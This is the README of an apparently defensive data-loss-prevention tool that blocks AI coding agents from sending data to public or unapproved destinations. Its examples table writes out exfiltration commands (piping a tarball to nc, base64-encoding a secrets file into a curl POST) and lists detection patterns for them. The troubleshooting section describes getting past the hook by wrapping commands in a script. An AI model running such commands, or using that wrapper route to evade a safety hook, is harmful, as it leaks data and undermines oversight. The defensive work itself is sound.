# AgentX DLP

Data-loss prevention for AI coding agents.

AI agents now execute actions, not just suggest them. Ask Claude Code or Cursor "what's the
easiest way to share this architecture diagram?" and a plausible answer is *"create a gist"* —
which is public by default. The agent may then run that command itself, with your credentials,
in one turn. Endpoint DLP sees a file leaving a laptop and cannot tell whether you chose to
share it or your agent was talked into it.

AgentX DLP sits at the **agent's action boundary** and answers two questions before anything
leaves the machine:

| | |
|---|---|
| **Where is this data going?** | Is the destination on the approved list? (`dlp/semantic-analyzer.js` + `dlp/allowlist.js`) |
| **What is this data?** | Secrets, PII, or classified content? (`dlp/content-scanner.js`) |

A violation needs **both** — a sensitive subject *and* an unapproved destination. That keeps
read-only work and internal transfers untouched.

> **Status: working prototype.** It enforces real rules and has a test suite, but it has not
> been through a wide production rollout — see [Limitations](#limitations) before relying on it.
>
> The shipped policy uses **placeholder identifiers** (`your-company.com`, `your-org`). It is a
> worked example to adapt, not a config to adopt — start at [POLICY.md §8](POLICY.md#8-adapting-this-to-your-organization).

---

## The concrete case it exists for

The recurring incident pattern this targets: an engineer moves internal work somewhere
convenient — a personal GitHub repo, a gist, a paste site — and the destination turns out to be
world-readable. Proprietary material (architecture diagrams, hardware bills of materials,
infrastructure config) ends up on the public internet through an account nobody is watching.

That used to require a human to type the command. Now the agent will offer to do it, and then
do it, in the same turn.

AgentX DLP blocks it before it runs — `gh repo create` without `--private`/`--internal`,
`gh gist create` without `--secret`, and `git push` to any org outside the approved list.

---

## Three surfaces

| Surface | Mechanism | Enforcement point | Can block? |
|---|---|---|---|
| **Claude Code** | `PreToolUse` plugin hook | Before every tool call — `Bash`, `Write`/`Edit`, **and all MCP tools** | Yes — hard block |
| **Cursor / VS Code** | Extension | Watches active editor, clipboard, terminal output | Warns (post-hoc) |
| **Any model via proxy** | LiteLLM guardrail | On the request *and the response*, before it reaches the client | Yes — rejects the call |

They are complementary, not alternatives:

- The **hook** is the only layer that sees a tool about to execute locally. A proxy cannot stop
  `gh repo create` from running.
- The **proxy** is the only layer that sees the model's *prose* — it blocks the response that says
  *"paste it at a public gist"* before a human ever reads it, and stops secrets in the **prompt**
  from reaching the vendor at all.

---

## Quick start (Claude Code plugin)

```bash
git clone <this-repo> agentx-dlp && cd agentx-dlp

# register this directory as a local plugin marketplace, then install
claude plugin marketplace add "$PWD"
claude plugin install agentx-dlp@agentx-local
```

Restart Claude Code — hooks bind at session start. Verify:

```bash
claude plugin list          # agentx-dlp@agentx-local → enabled
claude plugin details agentx-dlp@agentx-local
```

The hook is `harness-only`: it runs outside the model context and costs **~0 tokens** per session.

### Optional: enable Layer 2

Layer 2 (LLM intent decisions) activates automatically if credentials are discoverable, in this
order:

1. `ANTHROPIC_API_KEY`
2. `ANTHROPIC_AUTH_TOKEN`
3. `~/.claude/.credentials.json` (Claude Code OAuth)

If none are found it **fails open** — Layer 1 is deterministic and still enforces everything it
catches. Nothing to configure if Claude Code itself is already authenticated.

> **Do not also run `dlp/setup.sh`.** That is the legacy standalone installer which writes the hook
> straight into `~/.claude/settings.json`. Combining it with the plugin double-fires the hook. Use
> it only if you are not using the plugin manager.

---

## How it works

```
tool call
   │
   ▼
┌──────────────────────────────────────────────────────────────┐
│ LAYER 1 — deterministic rules            ~0 ms, no API call  │
│                                                              │
│  1. obfuscation      base64/gzip/xxd → pipe → curl|nc|ssh,   │
│                      DNS exfil, fetch-piped-into-shell       │
│  2. direction        is data going OUT? (POST/PUT with a     │
│                      body, scp src→dst, push, publish)       │
│                      — a plain GET is never exfil            │
│  3. destination      is the host / GitHub org / bucket on     │
│                      the approved list?                      │
│  4. data source      which local files are referenced?       │
│  5. content tier     secrets, PII, classification markers    │
│                                                              │
│  HIGH → block (exit 2)      MEDIUM/ambiguous → Layer 2       │
└──────────────────────────────────────────────────────────────┘
   │ ambiguous
   ▼
┌──────────────────────────────────────────────────────────────┐
│ LAYER 2 — LLM intent decision       ~100 ms, Claude Haiku    │
│                                                              │
│  Reads the live session transcript (the hook receives         │
│  transcript_path) and passes the recent turns with the        │
│  command, so intent is judged in context:                    │
│    "share this with the team internally"  ≠                   │
│    "put this somewhere public"                                │
│                                                              │
│  Prompt caching + a constrained JSON response keep it fast.   │
│  Unavailable or timed out → fail open (logged).               │
└──────────────────────────────────────────────────────────────┘
```

**Exit codes** (the Claude Code hook contract): `0` allow · `2` block — stdout is shown to you and
fed back to the model as context, so the agent explains the block and offers approved alternatives.

### Data classification tiers

Sourced from your organization's data classification policy (canonical tags `public | confidential |
customer | restricted`):

| Tier | Leaving to an unapproved destination |
|---|---|
| `PUBLIC` | allowed |
| `CONFIDENTIAL` | **block** |
| `CUSTOMER DATA` | **block — fail-closed** |
| `RESTRICTED` | **block — fail-closed** |

*Fail-closed* means blocked even under uncertainty, and not overridable inline. Unlabeled internal
data defaults to `CONFIDENTIAL`, per policy.

---

## What gets blocked

| | Action | Result |
|---|---|---|
| ✗ | `gh gist create arch.drawio` | public gist |
| ✓ | `gh gist create --secret arch.drawio` | secret gist |
| ✗ | `gh repo create svc --public --source=. --push` | public repo |
| ✓ | `gh repo create svc --private --source=. --push` | private repo |
| ✗ | `git push git@github.com:someone-personal/copy.git main` | unapproved org |
| ✓ | `git push git@github.com:your-org/repo.git main` | approved org |
| ✗ | `curl -X POST https://unknown.example -F f=@infra.drawio` | sensitive file → unapproved host |
| ✓ | `curl https://api.github.com/repos/your-org/x` | read-only GET |
| ✗ | `tar czf - ./infra \| nc 203.0.113.9 4444` | compress → listener |
| ✗ | `base64 secrets.env \| curl -X POST https://x.example -d @-` | encode → upload |
| ✗ | `docker push myaccount/internal:latest` | public registry (Docker Hub default) |
| ✓ | `docker push registry.your-company.com/team/svc:v2` | internal registry |
| ✗ | `npm publish ./pkg` | public npm |
| ✓ | `npm publish --access restricted ./pkg` | restricted |

MCP tools are covered by the same policy:

| | MCP call | Result |
|---|---|---|
| ✗ | `github create_or_update_file` with `owner: <personal>` | unapproved org |
| ✓ | `github create_or_update_file` with `owner: your-org` | approved org |
| ✗ | email draft to `someone@gmail.com` | external recipient |
| ✓ | email draft to `someone@your-company.com` | internal — even with an SSN in the body |
| ✗ | browser `navigate` / `file_upload` to a public paste host | unapproved destination |
| ✓ | any read-only tool (`search_*`, `list_*`, `get_*`, `WebFetch`) | reads are never exfil |

**Never blocked:** reads and inbound transfers (`curl` GET, `git clone/pull`, `npm/pip/go install`)
and internal transfers to `*.your-company.com` or another approved host. Moving sensitive data
*internally* is not exfiltration.

**Out of scope by design:** OS and physical channels — AirDrop, USB/removable media, printing,
screenshots. Endpoint DLP owns those. See [ARCHITECTURE.md](ARCHITECTURE.md) for the honest threat
model, including what this cannot stop.

Full rule-by-rule reference with provenance: **[POLICY.md](POLICY.md)**.

---

## Repo layout

```
dlp/                       Claude Code plugin hook (Node, no deps for Layer 1)
├── exfil-hook.js            entry point: reads the event, routes, blocks or allows
├── semantic-analyzer.js     Layer 1 — direction + destination + obfuscation
├── content-scanner.js       secrets / PII / classification-tier detection
├── mcp-handler.js           generic + MCP tool coverage
├── allowlist.js             approved hosts, GitHub orgs, bucket prefixes
├── patterns.js              sensitive file extensions and name patterns
├── intent-classifier.js     Layer 2 — Haiku with transcript context
├── bench-layer2.js          Layer 2 latency benchmark
└── setup.sh                 legacy standalone installer (see warning above)

.claude-plugin/            plugin + local-marketplace manifests
hooks/hooks.json           PreToolUse registration (matcher ".*")

src/                       VS Code / Cursor extension (TypeScript → out/)
├── extension.ts             activation, commands, log webview
├── responseScanner.ts       editor / clipboard / terminal watchers
├── dlpEngine.ts             pattern engine + IntentAnalyzer
├── intentAnalyzer.ts        TypeScript port of Layer 1
└── chatLogger.ts            in-memory event log

litellm/                   LiteLLM proxy guardrail (Python)
├── agentx_dlp_guardrail.py CustomGuardrail — pre-call + post-call hooks
├── dlp_patterns.py          Python port of the detectors
├── config.yaml              proxy config wiring the guardrail
└── test_patterns.py         detector unit test (no litellm needed)

test/run-tests.sh          hook test harness (data-driven, test/cases.jsonl)
POLICY.md                  rules + provenance
ARCHITECTURE.md            threat model, diagrams, design trade-offs
CONTRIBUTING.md            how to add or change a rule
```

---

## Configuration

Everything policy-related is data, in three files:

| Change | File | Constant |
|---|---|---|
| Approve a host | `dlp/allowlist.js` | `APPROVED_HOSTS` |
| Approve a GitHub org | `dlp/allowlist.js` | `APPROVED_GITHUB_ORGS` |
| Approve a bucket prefix | `dlp/allowlist.js` | `APPROVED_BUCKET_PREFIXES` |
| Add a sensitive file type | `dlp/patterns.js` | `SENSITIVE_FILE_EXTENSIONS`, `SENSITIVE_FILE_NAME_PATTERNS` |
| Add a secret / PII detector | `dlp/content-scanner.js` | `SECRET_DETECTORS`, `PII_DETECTORS` |
| Add a classification marker | `dlp/content-scanner.js` | `CLASSIFICATION_MARKERS` |

The same policy is implemented three times — Node (`dlp/`), TypeScript (`src/intentAnalyzer.ts`)
and Python (`litellm/dlp_patterns.py`). A rule change must land in all three. See
[CONTRIBUTING.md](CONTRIBUTING.md) for the parity checklist; this duplication is known debt.

---

## The other two surfaces

### Cursor / VS Code extension

```bash
npm install
npx tsc -p ./          # compiles src/ → out/
# then press F5 in VS Code to launch an Extension Development Host
```

Commands (Command Palette): **AgentX DLP: Start Monitoring**, **Stop Monitoring**,
**Show Activity Log**, **Clear Logs**.

It watches the active editor, polls the clipboard, and reads terminal output — so it catches the
case where the AI *suggests* a public destination and you copy the command. It **warns**; it cannot
block, because VS Code exposes no pre-execution gate.

### LiteLLM proxy guardrail

```bash
pip install -r litellm/requirements.txt
export PYTHONPATH="$PWD/litellm"
litellm --config litellm/config.yaml     # serves on :4000
```

Point any client's base URL at the proxy. Two guardrail entries are wired in `config.yaml`:
`pre_call` scans the prompt (stops secrets and top-tier data reaching the vendor) and `post_call`
scans the response (rejects share-suggestions, echoed secrets, external destinations). Violations
return HTTP 400. Set `mode: "redact"` instead of `"block"` to replace offending spans with
`[REDACTED-DLP]`. See [litellm/README.md](litellm/README.md).

---

## Testing

```bash
bash test/run-tests.sh                    # hook: data-driven case matrix
bash test/run-tests.sh mcp                # filter cases by label substring
cd litellm && python3 test_patterns.py    # Python detectors (no deps)
npx tsc -p ./                             # extension compiles
```

Cases live in `test/cases.jsonl` — one JSON object per line, fed to the hook verbatim on stdin.
Every policy change needs **both** a BLOCK case and the matching ALLOW case that proves you did
not over-block.

---

## Troubleshooting

**A legitimate command was blocked.** Reproduce it directly and read the reason:

```bash
echo '{"tool_name":"Bash","tool_input":{"command":"<your command>"}}' | node dlp/exfil-hook.js
echo "exit=$?"     # 2 = blocked
```

Then either narrow the rule or add the destination to `dlp/allowlist.js`. Guiding principle: prefer
a false positive over a false negative for top-tier data, but **never** over-block a read-only
operation.

**Advisories** (non-blocking findings, e.g. a secret written to a local file) are appended to
`~/.claude/agentx-dlp.log`. They are never written to stderr, so they cannot disturb a tool call.

**Changes to `dlp/` had no effect.** The plugin runs from a *cached copy*. `claude plugin update`
is a no-op unless the version changes, so bump the version in **both**
`.claude-plugin/plugin.json` and the `agentx-dlp` entry in `.claude-plugin/marketplace.json`
(CI enforces that they match), then:

```bash
claude plugin marketplace update agentx-local
claude plugin update agentx-dlp@agentx-local
```

and restart Claude Code.

**Working on this repo with Claude Code is recursive.** The plugin screens the agent's own tool
calls, so a shell command containing a real exfil command gets blocked. Put example commands in
files (via Write, which is advisory-only) or inside a script and invoke the script — the hook sees
only the outer command.

---

## Limitations

Stated plainly, because a security tool that overstates its coverage is worse than none:

- **A determined insider can turn it off.** `claude plugin disable` takes seconds. This defends
  against the careless and the hijacked, not the deliberate. Endpoint and network DLP own that.
- **No monitor/shadow mode yet.** There is no way to run it in log-only mode to measure false
  positives before enforcing — the recommended first step for any real rollout.
- **No centralized event emission.** Findings are local (`~/.claude/agentx-dlp.log`); nothing
  reaches a SIEM yet.
- **Single-call analysis.** A multi-step chain (copy → rename → upload later) evades per-call
  inspection; there is no data-lineage tracking.
- **No `PostToolUse` scanning**, so indirect prompt injection arriving through tool *results* is
  only caught if it later attempts a blocked egress.
- **Streaming responses** are not yet scanned by the LiteLLM guardrail.
- **Detector parity is manual** across the three implementations.

---

## Naming

Two identities, deliberately: the repo and VS Code extension are **`agentx-dlp`**; the Claude Code
plugin is published as **`agentx-dlp`** in the **`agentx-local`** marketplace. Worth unifying
before wider distribution.

## Docs

- **[POLICY.md](POLICY.md)** — every rule, with provenance tags and how to adapt them
- **[ARCHITECTURE.md](ARCHITECTURE.md)** — threat model, diagrams, design trade-offs, known gaps
- **[CONTRIBUTING.md](CONTRIBUTING.md)** — adding rules, detector parity, releasing a plugin change
- **[litellm/README.md](litellm/README.md)** — proxy guardrail specifics

## License

MIT — see [LICENSE](LICENSE).
